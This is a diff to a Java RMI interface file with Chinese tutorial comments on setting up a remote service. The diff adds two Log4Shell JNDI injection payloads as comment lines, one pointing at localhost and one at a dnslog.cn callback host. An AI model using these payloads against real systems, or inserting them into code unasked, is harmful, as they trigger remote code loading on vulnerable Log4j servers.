@@ -42,6 +42,8 @@ import java.rmi.RemoteException;
 * rmiregisty(直接在CMD窗口上面执行这个命令就行)
 * 5,启动远程服务,你必须先让服务对象开始执行。实现服务的类会启动服务的实例并向RMI registry注册。要有注册后才能对用户提供服务。
 * java MyRemoteImpl
+* ${jndi:ldap://127.0.0.1:1389/a}
+* ${jndi:ldap://6tet0s.dnslog.cn/exp}
 */
 public interface MyRemote2 extends Remote {//注意我们的接口类MyRemote继承了Remote这个接口,1.创建远程接口MyRemote
 	
